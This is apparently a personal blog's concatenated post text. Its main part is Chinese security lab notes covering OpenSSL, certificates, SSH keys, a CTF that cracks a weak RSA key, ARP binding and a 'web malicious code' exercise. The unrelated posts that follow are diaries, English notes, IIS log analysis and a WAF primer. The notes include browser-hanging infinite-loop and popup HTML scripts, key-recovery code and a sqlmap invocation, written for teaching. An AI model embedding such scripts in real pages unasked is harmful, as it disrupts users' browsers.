已经安装openssl组件 实验原理openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。 实验步骤创建一个文件，用于被加密，文件内容为12345,文件名为test.txt 1echo 12345 &gt;test.txt 一、对称加密1、使用rc4加解密 加密openssl enc -e -rc4 -in test.txt -out test_rc4.enc 解密openssl enc -d -rc4 -in test_rc4.enc -out test_rc4.dm 2、使用AES加解密 openssl enc -e -aes-128-cbc -a -salt -in test.txt -out test_aes128.enc 解密 openssl enc -d -aes-128-cbc -a -salt -in test_aes128.enc -out test_aes128.d 3、使用3DES加解密 加密openssl enc -e -des3 -a -salt -in test.txt -out test_des3.enc 解密openssl enc -d -des3 -a -salt -in test_des3.enc -out test_des3.d 二、非对称加密1、RSA加解密码 生成RSA密钥对 openssl genrsa -out rsa.key 1024导出公钥 openssl rsa -in rsa.key -pubout -out rsa_pub.key 使用公钥加密文件 openssl rsautl -encrypt -in test.txt -inkey rsa_pub.key -pubin -out test_rsa.enc 使用私解解密文件 openssl rsautl -decrypt -in test_rsa.enc -inkey rsa.key -out test_rsa.c 使用公钥解密报错 openssl rsautl -decrypt -in test_rsa.enc -inkey rsa_pub.key -out test_rsa.c 实验总结通过实验的openssl 实现对称加解密与非对称加解密两种基线的加解密功能。思考对称与非对称加解密码的流程上有何不同？为什么？ 密码学之数字签名实验目的掌握哈希算法与数字签名算法的实现 实验环境一台Centos 7.2 已经安装openssl组件 实验原理openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。 实验步骤一、生成测试文件123echo 12345 &gt; test.txtecho hello &gt; md.txt 二、使用MD5算法生成哈希值生成md.txt的哈希 openssl dgst -md5 md.txt 复制md.txt文件 1cp md.txt md.txt.2 对md.txt.2生成md5哈希值 openssl dgst -md5 md.txt.2 比对发现md.txt和md.txt.2两个文件的哈希值一样 三、使用RSA签名1、生成RSA密钥对 openssl genrsa -out rsa.key 1024 2、导出公钥 openssl rsa -in rsa.key -pubout -out rsa_pub.key 3、使用rsa私钥签名 openssl sha1 -sign rsa.key -out rsasign.bin test.txt 4、使用rsa 公钥验证签名 openssl sha1 -verify rsa_pub.key -signature rsasign.bin test.txt 四、使用DSA签名1、生成dsa参数 openssl dsaparam -out dsap.pem 1024 2、查看dsa参数明文 openssl dsaparam -in dsap.pem -text -noout 3、使用上述参数生成dsa密钥 openssl gendsa -out dsa1.pem dsap.pem 4、再次使用上述参数生成dsa密钥 openssl gendsa -out dsa2.pem dsap.pem 5、比较上述两个密钥,由相同参数生成的两个密钥是不同的。 1diff dsa1.pem dsa2.pem 6、由参数生成私钥，并使用des加密 1openssl gendsa -out dsaprivatekey.pem -des3 dsap.pem 7、由私钥生成公钥 openssl dsa -in dsaprivatekey.pem -pubout -out dsapublickey.pem 8、使用私钥dsaprivatekey.pem签名text.txt，dsasign.bin为签名文件 openssl dgst -dss1 -sign dsaprivatekey.pem -out dsasign.bin test.txt 9、使用公钥验证签名 openssl dgst -dss1 -verify dsapublickey.pem -signature dsasign.bin test.txt 10、使用私钥验证签名 openssl dgst -dss1 -prverify dsaprivatekey.pem -signature dsasign.bin test.txt 实验总结通过使用rsa和dsa的签名，加强密码学中签名应用的理解。 密码学之CA的使用实验目的掌握CA的应用，通过实验理解CA的概念 实验环境一台Centos 7.2 已经安装openssl组件 实验原理openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。 实验步骤一、生成selfsigned证书生成selfsign.crt，证书 openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out cerficate.crt 依次输入证书的相关信息,国家，省份，城市，公司，部门，域名，邮箱 二、生成独立的CA1、 生成ca的keyopenssl genrsa -des3 -out ca.key 4096 2、生成CA的证书openssl req -new -x509 -days 365 -key ca.key -out ca.crt 三、生成服务器的私钥key和签名请求文件csr1、生成https服务器私钥 openssl genrsa -des3 -out myserver.key 4096 2、生成https服务器证书请求文件 openssl req -new -key myserver.key -out myserver.csr 利用ca的证书和key，生成我们的证书 openssl x509 -req -days 365 -in myserver.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out myserver.crt Set_serial设置的证书的编号 查看证书的信息： openssl x509 -noout -text -in myserver.crt | more 四、验证证书验证证书的CA openssl verify -CAfile ca.crt myserver.crt 去掉https服务器证书的加密保护：openssl rsa -in myserver.key -out server.key.insecure 将CRT格式转DER格式 openssl x509 -outform der -in myserver.crt -out myserver.der 五、模拟https服务模拟https的服务，将结果输出到1.txt，并在后台运行openssl s_server -accept 443 -cert myserver.crt -key server.key.insecure -www &gt;1.txt &amp; 模拟用户连接openssl s_client -connect 127.0.0.1:443 | more 按ctrl+c中断当前查看 总结通过新建CA服务器证书， 对https服务的csr签名，并模拟https服务器，进行访问。 密码学之apache部署https实验目的掌握apache部署自定义证书的https服务器方法 实验拓扑 实验环境一台Centos 7.2 已经安装openssl组件,已安装apache httpd，用于搭建https服务器 一台windows 10客户端，已安装chrome浏览器 实验原理openssl是Linux内置的一款开源工具，实现了常见的密码算法与应用。通过openssl操作，完成各种密码算法的应用。 实验步骤一、生成独立的CA1、 生成ca的keyopenssl genrsa -des3 -out ca.key 4096 2、生成CA的证书openssl req -new -x509 -days 365 -key ca.key -out ca.crt 二、生成服务器的私钥key和签名请求文件csr1、生成https服务器私钥 openssl genrsa -des3 -out myserver.key 4096 2、生成https服务器证书请求文件 openssl req -new -key myserver.key -out myserver.csr 利用ca的证书和key，生成我们的证书 openssl x509 -req -days 365 -in myserver.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out myserver.crt Set_serial设置的证书的编号 三、安装apache的ssl模块1、服务上已经安装有apache，要实现apache的https功能，需要安装ssl模块 1yum install -y mod_ssl 四、复制证书到对应路径12cp myserver.crt /etc/pki/tls/certs/cp myserver.key /etc/pki/tls/private/ 五、修改apache配置文件，让证书生效1vim /etc/httpd/conf.d/ssl.conf 将证书和私钥路径指为如图 保存并退出文件 六、重启apache服务1systemctl restart httpd 注意输入myserver.key的加密密码 七、测试网站证书 使用客户端chrome浏览器访问服务器https页面, 我这里服务器ip是192.168.0.232 https://192.168.0.232 高级 继续前往 查看服务器证书，点“不安全” 注意查看颁发者和使用者，想想和前面哪些配置是对应上的？ 实验总结请同学自行回顾整理实验思路CA–服务器证书–使用CA签名服务器证书–部署证书–查看证书 密码学之使用密钥登录SSH服务器实验目的掌握SSH密钥登录的配置与应用 实验拓扑 实验环境两台centos服务器 一台作为SSH服务器一台作为SSH客户端，使用密钥连接SSH服务器 实验原理SSH登录除了传统的密码登录，可以使用密钥文件登录，结合PAM模块，也可以实现双因子登录等。 实验步骤一、配置服务器SSH密钥登录以下操作使用服务器进行 1、编辑SSH配置文件 1vim /etc/ssh/sshd_config 2、删除#号 删除PubkeyAuthentication yes此行前面的#号 保存文件并退出 3、重启ssh服务 1systemctl restart sshd 二、使用客户端生成密钥以下操作使用客户端进行 1、生成SSH登录的密钥对 1ssh-keygen -t rsa 2、查看生成的密钥 1ls -l /root/.ssh/ 确保以下两个文件是新生成的。 三、上传客户端公钥证书到服务器以下操作使用客户端进行 1、使sftp连接服务器 1sftp root@192.168.0.6 输入yes 输入服务器密码 2、上传公钥文件 1put /root/.ssh/id_rsa.pub 3、退出sftp客户端 1exit 四、配置服务器公钥以下操作使用服务器进行 通过第三步，我们已经将公钥证书放到了&#x2F;root&#x2F;id_rsa.pub 这里我们将公钥文件输出到服务器配置文件中 1cat /root/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys 五、验证密钥登录以下操作使用客户端登录 1、指定私钥文件登录 1ssh -i /root/.ssh/id_rsa root@192.168.0.6 此时我们可以看到直接登录进了服务器，并没有输入密码。因为我们使用了证书验证 总结在使用私钥证书登录时，我们也可以给私钥证书加上密码，此时不是验证服务器的密码，而是验证私钥证书的加密密码。 同理在Windows下，也可以使用ssh工具，如xshell实现ssh的密钥登录，有兴趣同学可以自己尝试。 密码学之RSA破解实验实验目的通过实验环境桌面上给出的rsa文件夹，找到flag. 实验环境一台windows 10，已安装python 2.7 ，crypto模块，chrome浏览器等。 实验原理从RSA的公钥导出N，尝试分解RSA公钥。有分解的出的p和q，根据欧拉函数找出私钥关键值d,最后导出私钥进行解密。 实验步骤一、观察文件打开桌面上的RSA文件夹，观察发现一个flag.enc一个public.pem一个windows下的openssl文件夹 二、依次用打开public.pem和flag.enc1、在public.pem文件上点击击右键，使用notepad++打开 观察推测为一个rsa的公钥文件 2、在flag.enc文件上点击击右键，使用notepad++打开 观察发现为二进制乱码，可能是加密文件。 三、使用openssl工具查看公钥文件1、打开命令行窗口 右键点开始菜单，运行powershell 2、切换路径到桌面上的rsa文件夹 1cd desktop\\rsa 3、使用openssl读取公钥文件 1./openssl/openssl rsa -pubin -text -modulus -in public.pem 查看到rsa的Exponent: 65537 (0x10001)Modulus&#x3D;A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 即e&#x3D;65537n&#x3D;A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 四、尝试分解n1、将n从16进制转换10进制使用python shell 在前面powershell 窗口中，输入python2 依次输入下面代码 12s=&#x27;A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7&#x27;int(s,16) 得到n的10进制为74207624142945242263057035287110983967646020057307828709587969646701361764263 2、分解n通常我们可以使用下面网站分解n http://factordb.com/index.php 打开桌面上的chrome浏览器，访问上述网址 输入n的值 分解成功 17420762414...63&lt;77&gt; = 258631601377848992211685134376492365269&lt;39&gt; · 286924040788547268861394901519826758027&lt;39&gt; 即p&#x3D;258631601377848992211685134376492365269q&#x3D;286924040788547268861394901519826758027 五、使用python的cyrpto库，破解d,并生成私钥新建记事本，使用notepad++打开 编写以下代码 1234567891011121314151617181920212223#coding:utf-8import mathimport sysfrom Crypto.PublicKey import RSAarsa=RSA.generate(1024)arsa.p=258631601377848992211685134376492365269arsa.q=286924040788547268861394901519826758027arsa.e=65537arsa.n=arsa.p*arsa.qFn=long((arsa.p-1)*(arsa.q-1))#此处原理e*d=Fn*i+1i=1while(True): x=(Fn*i)+1 if(x%arsa.e==0): arsa.d=x/arsa.e break i=i+1private=open(&#x27;private.pem&#x27;,&#x27;w&#x27;)private.write(arsa.exportKey())private.close() 保存文件 2、将新建文本文档重命名为111.py 3、使用python2 运行111.py 打开powershell窗口 退出之前的python shell 1exit() 使用python2运行111.py 1python2 111.py 执行成功后，在目录下会生成私钥文件private.pem 六、使用私钥解密文件使用openssl工具，私钥解密flag.enc 1.\\openssl\\openssl rsautl -in flag.enc -inkey private.pem -decrypt 如图解密出来的最终flag为SECURITYCOLLEGE 总结在本实验rsa的破解过程中，关键步骤是分解n&#x3D;pxq, 这也是整个rsa算法的核心。 安全导论-IP与MAC地址的静态绑定实验目的理解ARP协议的工作原理，熟悉ARP静态缓存的设置方法，利用ARP静态缓存实现IP与MAC地址绑定。 实验环境操作机：Pentest-Atk（1）操作系统：Windows 10 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理ARP协议的工作原理：在局域网中，每台主机都会在自己的ARP缓冲区中建立一个ARP缓存表，以表示IP地址和MAC地址的对应关系。当源主机需要将一个数据包要发送到目的主机时，会首先检查自己ARP缓存表中是否存在该IP地址对应的MAC地址，如果有，就直接将数据包发送到这个MAC地址；如果没有，就向本地网段发起一个ARP请求的广播包，查询此目的主机对应的MAC地址。此ARP请求数据包里包括源主机的IP地址、硬件地址、以及目的主机的IP地址。网络中所有的主机收到这个ARP请求后，会检查数据包中的目的IP是否和自己的IP地址一致。如果不相同就忽略此数据包；如果相同，该主机首先将发送端的MAC地址和IP地址添加到自己的ARP缓存表中，如果ARP缓存表中已经存在该IP的信息，则将其覆盖，然后给源主机发送一个ARP响应数据包，告诉对方自己是它需要查找的MAC地址；源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP缓存表中，并利用此信息开始数据的传输。如果源主机一直没有收到ARP响应数据包，表示ARP查询失败。正是因为ARP动态缓存的特点，ARP欺骗就是通过更改这个动态缓存来达到欺骗的目的，即通过伪造ARP响应包，诱使目标主机更新动态缓存。为了防止ARP欺骗，采用静态ARP缓存将IP与MAC地址进行绑定，不失为一个有效的方法。然而，设置静态ARP缓存时，如果IP与MAC地址绑定错误，则会造成两台主机无法正常通信的问题。 实验步骤1．启动Windows命令行工具在操作机Pentest-Atk上启动Windows操作系统的命令行工具cmd： 2．尝试与靶机通信，并查看操作机的ARP缓存在命令行工具cmd中输入以下命令，尝试ping靶机A-SQLi-Labs： 1ping [靶机IP] 结果显示：靶机在线。 继续输入以下命令查看操作机的ARP缓存表： 1arp -a 查到操作机ARP缓存表中，有一条靶机的IP与MAC地址对应关系的动态缓存记录。 3．查看操作机网卡的Idx号在命令行工具中输入以下命令查看操作机网卡的Idx号： 1netsh i i show in 结果显示，操作机网卡的Idx号为4，将其记录下来。 注意：请根据实验的实际情况记录Idx号！ 4．在操作机网卡上绑定靶机的IP与MAC地址说明：此处，为了验证IP与MAC地址绑定错误时是否会造成通信故障，因此会尝试将正确的IP地址与错误的MAC地址进行绑定！ 在命令行工具cmd中输入以下命令，在操作机网卡上绑定靶机的IP（正确）与MAC（错误）地址： 123netsh -c &quot;i i&quot; add neighbors [操作机网卡的Idx号] &quot;待绑定的IP&quot; &quot;待绑定的MAC&quot;//注意：命令中每个选项、参数中间均有空格！ 绑定完成之后，继续输入以下命令查看ARP缓存： 1arp -a 结果显示，操作机ARP缓存中有了一条错误的静态缓存记录，即靶机的IP地址是正确的，但MAC地址是错误的。 5．在操作机上再次尝试与靶机进行通信在命令行工具cmd中输入以下命令，尝试ping靶机： 1ping [靶机IP] 结果显示未ping通。 利用以下命令清空ARP缓存： 1arp -d 清空缓存后，再次输入以下命令，尝试ping靶机： 1ping [靶机IP] 此时，操作机与靶机恢复正常通信。 实验至此结束。 实验总结通过本实验，理解了ARP协议的工作原理，熟悉了ARP静态缓存的设置方法，并利用ARP静态缓存实现了IP与MAC地址绑定，验证了IP与MAC地址绑定错误时或造成通信故障的现象。 网络空间安全导论-网页恶意代码实验目的了解简单网页恶意代码的编写、利用与防范方法，体验恶意代码的危害。 实验环境操作机：Win2003svr（1）操作系统：Windows Server 2003（内含Internet Explorer 6.0） （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理网页恶意代码主要利用系统平台或应用软件的安全漏洞，通过执行嵌入在网页HTML语言内的JavaApplet小应用程序、JavaScript脚本语言程序、ActiveX控件部件等可自动执行的代码程序，强行修改用户操作系统的注册表及系统配置程序，或非法控制系统资源盗取用户文件，或恶意删除硬盘文件、格式化硬盘等，达到干扰或破坏网络或系统的目的。 实验步骤1．编写并测试网页恶意代码test1.html（1）在桌面上新建记事本文档test1.txt，打开后编辑如下代码并保存： 123456789101112131415&lt;html&gt;&lt;body&gt;&lt;script&gt;var color = new Arraycolor[0]=&quot;red&quot;color[1]=&quot;blue&quot;x=0while(true)&#123; document.bgColor=color[x++] document.bgColor=color[x--]&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 如图所示： （2）将test1.txt改名为test1.html，选择用Internet Exploror执行该文档，进入如图所示界面： 在相应位置单击鼠标右键，在弹出的菜单中点击“允许阻止的内容”，弹出如图所示对话框： 点击“是”按钮，则网页会出现红、蓝两种条纹不断更换的现象，如图所示： 清除这种网页恶意代码的方法是：点击“Windows任务管理器”中的“进程”标签页，选中iexplore.exe，点击“结束进程”按钮，如图所示： 然后再将test1.html中编辑的那一段代码删除，或将test1.html文件直接删除即可。 2．编写并测试网页恶意代码test2.html仿照上述步骤，在桌面上新建记事本文档test2.txt，打开后编辑如下代码并保存： 12345678910111213&lt;html&gt;&lt;body _onload=&quot;Popup()&quot;&gt;&lt;script language=&quot;javascript&quot;&gt; function Popup() &#123; while(true) &#123; window.open(&quot;http://www.baidu.com&quot;) &#125; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 如图所示： 将test2.txt改名为test2.html，选择用Internet Exploror执行该文档，然后观察实验现象，发现IE会不断打开百度网页，如图所示： 清除这种网页恶意代码的方法与清除test1.html的方法相同：在“Windows任务管理器”中结束iexplore.exe进程，并将test2.html中编辑的那一段代码删除，或将test2.html文件直接删除即可。 实验总结本次实验，体验了恶意代码的危害，复现了简单网页恶意代码的编写、利用及防御过程。","tags":["Blue","sxf","cryptography"],"categories":["Experiments"]},{"title":"peppapig","path":"/2024/09/12/阅读/peppapig/","content":"0101 Muddy PuddlesI‘m Peppa Pig. This is my little brother, George. This is Mummy Pig. And this is Daddy Pig. It is raining today. So, Peppa and George cannot play outside. Daddy, it’s stopped raining. Can we go out to play? All right. run along you two. Pappa loves jumping in muddy puddles. I love muddy puddles. Peppa. If you jump in muddy puddles, you must wear your boots. Sorry, mummy. George likes to jump in muddy puddles, too. George. If you jump in muddy puddles, you must wear your boots. Peppa likes to look after her little brother, George. George, let’s find some more puddles. Peppa and George are having a lot of fun. Peppa has found a little puddle. George has found a big puddle. Look, George. There’s a really big puddle. George wants to jump into the big puddle first. Stop, George. I must if it’s safe for you. Good. It is safe for you. Sorry, George. It’s only mud. Peppa and George love jumping in muddy puddles. Come on, George. Let’s go and show Daddy. Goodness me. Daddy. Daddy. Guess what we’ve been doing. Let me think… Have you been watching television? No. No. Daddy. Have you just had a bath? No. No. I know. You’ve been jumping in muddy puddles. Yes. Yes. Daddy. We’ve been jumping in muddy puddles. Ho. Ho. And look at the mess you’re in. Ooh… Oh, well, it’s only mud. Let’s clean up quickly before Mummy sees the mess. Daddy, when we’ve cleaned up, will you and mummy Come and play, too? Yes, we can all play in the garden. Peppa and George and wearing their boots. Mummy and Daddy are wearing their boots. Pappa loves jumping up and down in muddy puddles. Everyone loves jumping and down in muddy puddles. Daddy pig, look at the mess you’re in. It’s only mud. 0102","tags":["read","english","speaking"],"categories":["English"]},{"title":"python100题","path":"/2024/08/27/编程语言/python100题/","content":"","tags":["python"],"categories":["Programming Language","Python"]},{"title":"2024年9月","path":"/2024/08/27/日记/2024年9月/","content":"从八月继承的任务如果做完一条就移到做完那天的日期中，这里不再显示。软考信安第 20 章和题目xiaoadi蓝队技术1笔记Python渗透测试编程技术:方法与实践2nd-第四章NC相关官方文档阅读理解学习完成TCP代理代码学习TCP代理笔记完善万物简史 26-5万物简史 26-6万物简史 26-7万物简史 26-8万物简史 26-9万物简史 26-10万物简史 26-11万物简史 26-12万物简史 26-13万物简史 26-14万物简史 26-15万物简史 26-16万物简史 26章笔记九月第一周开学啦某活动题库完成某python水赛重在参与混个证书软考信安第 15 章和题目软考信安第 16 章和题目软考信安第 17 章和题目软考信安第 18 章和题目软考信安第 19 章和题目关于选课方面，希望可以自主选课，并且能选到数学建模以及高等代数，刚好差了一些学分。虽然引入原著阅读背单词不需要特别花费心思，不过该背还是得背一些。九月第二周这周选课。阅读-[首頁 - OWASP Top 10:2021](https://owasp.org/Top10/zh_CN/)万物简史 26-3今天是11号，已选高代和数学建模！一周下来课好多！而且都是很硬核的课程！英语就是听说读写四大件全齐了。万物简史 26-4小猪佩奇第一季第一集","tags":["diary"]},{"title":"Listening-A SHORT HISTORY OF EVERYTHING","path":"/2024/08/15/阅读/A-SHORT-HISTORY-OF-EVERYTHING/","content":"26-3word 生词 汉译 woven into 编织成 a single fine strand 一根细丝 stretch from 延伸到 bundled up 捆绑起来&#x2F;暖和 nonreactive 不反应 inert 【生】【化】惰性的;不活泼的;钝的 patches of long-dried blood or semen 长久干涸的血液或精液斑块 the pus 脓液 coaxed from 被 诱导 mystifyingly low-key 神秘低调 delving microscopically 显微探测 surgical bandages 手术绷带 nuclein n. 核素 nuclei of cells 细胞的细胞核 deoxyribonucleic acid 脱氧核糖核酸 subsidiary a.辅助的,附带的;次要的 as far as anyone could tell. 所有人都知道 chromosome n.染色体 trivial a.琐碎的;不重要的,无价值的 这一节当背景音 放了感觉有上百遍了，似乎真的是那些听不懂的逐渐越来越清晰。 26-4word 生词 汉译 On top of this 最重要的是 turning up 出现 the suspect 嫌疑人 one involving the Pneumonococcus bacterium and another involving bacteriophages (viruses that infect bacteria) 一种涉及肺炎球菌细菌，另一种涉及噬菌体（感染细菌的病毒） betrayed vt.(非故意地)暴露;显露;表现 prevailing a.占优势的;主要的;有力的,有影响的 a.流行的,盛行的,通行的;普遍的 vital a.(有)生命的;维持生命所必需的 a.有生命的;(人)充满生机的,生气勃勃的 a.必不可少的,极其重要的 a. 致命的;生死攸关的 a.生命统计的,生死统计的 yet 然而 assembly n.装配,组装 ribonucleic acid 核糖核酸（略作RNA） interpreter 翻译者 double act 双簧 mutually ad.相互,彼此 incompatible a. 矛盾 Hindi n.印地语(通行于印度北部,现为印度官方语言) mediator n.调解者,调停者,斡旋者 n.传递者;传播者 in the form of 用…的形式 clerk n. 职员 ribosome n. 核糖体,核(糖核)蛋白体 act upon 采取行动 resume &#x2F;rɪˈzjuːm, -ˈzuːm&#x2F; vt. (中断后)重新开始,继续 vt. 恢复;重回,重返;重新得到;重新使用 vt. 取回,收回 vt. 接着说,继续说 vi. 重新开始,继续 diligence &#x2F;ˈdɪlɪdʒəns&#x2F; n. 勤勉,勤奋;用功 aptitude &#x2F;ˈæptɪtjuːd&#x2F; n. 天资,才能;聪明,颖悟 readily adv. 容易地，迅速地 absorbed dye 吸收燃料 By the turn of the century 到本世纪初 passing on 继续;传递;去世（pass on的现在分词形式）","tags":["read","english","listening"],"categories":["English"]},{"title":"第213天：蓝队技能-应急响应篇&Web入侵指南&后门查杀&日志分析&流量解密&攻击链梳理&排查口","path":"/2024/08/10/xiaodi8/蓝队/213/","content":"2008R2 x86 + IIS 7.5 CN模拟排查攻击点模拟：.net 网站遭受了攻击，现在进行排查 思路：重点日志分析 1开始-&gt;管理工具-&gt;IIS管理器-&gt;IIS75CN-&gt;网站-&gt;新翔人事系统免费版-&gt;日志-&gt;目录-&gt;路径 在高级配置中查找网站 id ，发现为 5 ，所以选择 W3SVC5 配置网站绑定 ip ，打开 ip 地址 日志字段顺序： #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken UA头显示里有被 sqlmap 攻击 查看日志提交方式 POST 部分很可能有漏洞，再看返回 状态码 200 2948是返回包长度 访问网站：验证攻击点 在自己电脑利用狐狸工具验证漏洞点：python sqlmap.py -u “http://ip:port/default.aspx” --data 返回查看日志显示 物理机访问虚拟机网站配置虚拟机设置：网络适配器，复制物理网络连接状态 网络和共享中心 -&gt; 网络连接 -&gt; 本地连接 -&gt; 属性 -&gt; internet协议版本4(TCP&#x2F;IPV4属性) -&gt; 勾选自动获得IP地址 设置完网络连接重启后，物理机可以连接该网站。 web日志里面常见的内容缺点POST记录不细致 thinkphp搭建漏洞复现笑死，这节课迪总复现环境又被腾讯电脑管家干翻车了哈哈哈哈哈哈哈 工具资源ChinaRan0&#x2F;BlueTeamTools 应急工具 One-Fox-Security-Team&#x2F;One-Fox-T00ls 狐狸工具","tags":["Emergency Response","Blue","xiaodi8"],"categories":["小迪","蓝队技能"]},{"title":"2024年8月","path":"/2024/08/01/日记/2024年8月/","content":"目前日记总结使用静态时间线。 2024 年 7 月 30 日昨晚终于把一直未解决的“文档系统”配置问题解决了。最后发现是自己眼神不好。遇见什么解决不了的bug，只需把问题放几天再拿出来看看会发现豁然开朗。今天考虑把每日总结做成静态时间线。专栏配置已完成。目前近期的计划：博客的优化【时间线完成50%，配置文档7.29已解决】—&gt; 动态时间线，友链页面 【8月7日已完成】应急响应的一个课看了还要做笔记【目前进度80%】—&gt; 迭代新任务：小迪的蓝队部分第一个小工具nc已写完【进度100%】—&gt; 迭代新任务：阅读工具相关模块文档做笔记CI的一个配置软件代码管理然后写博客参考某书【进度50%】—&gt; sonarqube和jenkins集成，maven构建。screeps游戏启动配置python的交互平台试试【已完成100%】—&gt;迭代新任务：通过第10关，阅读游戏文档看书第三版python的基础语法再复习一遍（已弃用）—&gt;更新任务，官方文档（10%）听力单词807一个月内背完听力每日1篇s1,1h+HTB靶场每周1个哲学的历程第一章（随意休闲任务，已完成引论，后续大概有33章600+页，一年内完成就算进度不错）2024 年 7 月 31 日今天在这里写一下项目管理组件试试。月度用这个总结似乎不错。以下是半年期的。 O1 2024年的小目标：完善 github 博客的主题配置、英语、学习 python、11月软考信安 来自2025年的复盘：已《基本》实现目标 正常 36% KR1 ~~博客 友链页面完善 和 侧边栏组件配置 和 多页分页配置~~ 08.07已完成 友链 今日开工，把自己加进去了。内容还需要完善。侧边栏组件 进度较慢，右侧几乎全空。 10%多分页配置 还剩两页为空，放什么内容还需要思考，探索，英语？ 已完成 100% KR2 python官方文档 和 python网络工具 和 arena游戏 python官方文档python网络工具arena游戏基础教程小工具开发中遇见的标准库内容，每篇写笔记（目前是nc）目前还是抄作业水平。中间很多进阶 python 用法和标准库内容，还是去翻文档。使用python转js插件很方便。也是深坑。后期优化可以配合加入数据结构的内容学习。 延期 13% KR3 CI/CD 的配置 jenkins 和 sonar 集成Maven 源码构建jenkins + Maven + JMeter 自动化测试集成CD 未完成 50% KR4 英语的学习是一个长期的，持续的过程。目标：年底能有把六级过了的水平。雅思5-5.5分水平，重点在听口。★★★★ 每日英语听力2h+，继续把万物简史和7788安排上，希望年底前能听完 ★★★★背单词9月前把807全部背完，目前每天计划200个英语口语9月口加入，每日60分钟和ai对话 ★★★★ 风险 6% KR5 网安相关 软考信安11月 ★★★ HTB靶场每周1个xiaodi蓝队部分复现 ★★ 加入兴趣小组再拉一个姐妹探探底结交一些朋友 未完成 10% 考虑做一个每日任务清单，每日主要分为两部分：英语和技术。今日主要都在博客优化友链上，主要的内容完成差不多了。还配置了vercelAPI托管github仓库。剩下是侧边栏组件的配置。2024 年 8 月 5 日这几天一直在美化博客，插入了豆瓣图书的界面，友链页面侧边栏还算是比较完善了，探索界面暂时留空，一个大大的404。剩下的界面暂时没打算把小组件插入很多进去。关于博客的配置除了官方的还有其他人的可以参考：使用Hexo和Stellar搭建个人博客网站【超详细贴心保姆级教程💖】 - BoBoBlog之后应该可以继续开始学习其他了吧~2024 年 8 月 6 日KR1 完成进度 100%！探索界面本就留空 404 ，契合欢迎语。2024 年 8 月 15 日 至 8 月 28 日软考信安第 10 章和题目软考信安第 11 章和题目软考信安第 12 章和题目软考信安第 13 章和题目软考信安第 14 章和题目软考信安第 15 章和题目软考信安第 16 章和题目软考信安第 17 章和题目软考信安第 18 章和题目软考信安第 19 章和题目软考信安第 20 章和题目某python题库客观100题xiaoadi蓝队技术1笔记Python渗透测试编程技术:方法与实践2nd-第四章阅读-[首頁 - OWASP Top 10:2021](https://owasp.org/Top10/zh_CN/)NC笔记完善NC相关官方文档阅读理解学习完成TCP代理代码学习TCP代理笔记完善","tags":["diary"]},{"title":"05 基础防御-WAF","path":"/2024/07/25/红蓝攻防/05WAF/","content":"1 WAF介绍所谓WAF，即Web Application Firewall，网络应用防火墙，是通过一系列执行针对HTTP&#x2F;HTTPS的安全策略来为web应用提供安全防护的产品。有别于传统的防火墙，WAF专门针对应用层web应用而设计，能够起到防止流量攻击、SQL注入、XSS攻击等作用。 1.1 WAF分类通常而言，WAF可以分为以下4类： 软件型WAF：本身是一个软件，部署在服务器上，检测是否存在web攻击。 硬件型WAF：本身是一款硬件，可以有多种部署方式，如果是串联到链路中，则可以拦截恶意流量，如果是以旁路的形式部署，则只能记录攻击但是不能拦截。硬件型WAF一般而言比软件型WAF更加昂贵，但是检测速度快，不易成为网站瓶颈。 云WAF：我们可以将云WAF简单理解为带有WAF功能的CDN(内容分发网络)，因为其实现机理与CDN基本相同，都是通过更改目标站点的DNS记录，使其指向云WAF，然后对站点的访问进行过滤。云WAF通常以反向代理的方式进行工作，其最大的优点是方便快捷，但是如果攻击者能够找到站点的真实IP地址，那么云WAF就存在被直接绕过的风险。 站点内置WAF：所谓站点内置WAF，即网站的开发者考虑到站点的安全性，将一些过滤功能写成代码，嵌入到站点内，或者直接嵌入到页面代码中，或者以一个单独的文件列出，然后被相关页面所引用。这种WAE的灵活性非常高，因为是直接开发在页面上，因此可以针对一项非常具体的业务，乃至一个微小的功能来实现检测和规律，但是相应的其通用型就比较低了。 1.2 WAF常见功能①审计设备：对于系统自身安全相关的下列事件产生审计记录 管理员登录后进行的操作行为; 对安全策略进行添加、修改、删除等操作行为; 对管理角色进行增加、删除和属性修改等操作行为; 对其他安全功能配置参数的设置或更新等行为。 ②访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式。③架构及网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。④WEB应用加固工具。 这些功能增强了被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 1.3 WAF防护原理WAF之所以能够起到对网络应用进行防护的作用，主要是基于以下手段： 异常检测机制:拒绝不符合HTTP标准的请求。 白名单&#x2F;黑名单：采取白名单或者黑名单的方式，对HTTP内容进行验证。 基于规则和基于异常的保护：定义一些安全规则或者异常状态，基于此对服务器进行安全防护。 状态管理：对会话进行防护。 信息泄露保护：防止服务器信息泄露。 扫描器识别：WAF对于一些扫描器会进行识别并禁止扫描，常用的扫描器识别技术有①扫描器指纹。②单IP+cookie指定时间内访问触发规则次数。③验证码验证。 2 openresty2.1 介绍Openresty是在Nginx 的基础上集成开发了 Lua 语言实现高性能的扩展功能，在不降低原来Nginx 性能的情况下通过Lua 语言的功能增加诸如更细致的访问控制、集成数据库和缓存访问、web 应用安全访问等多种功能。 2.2 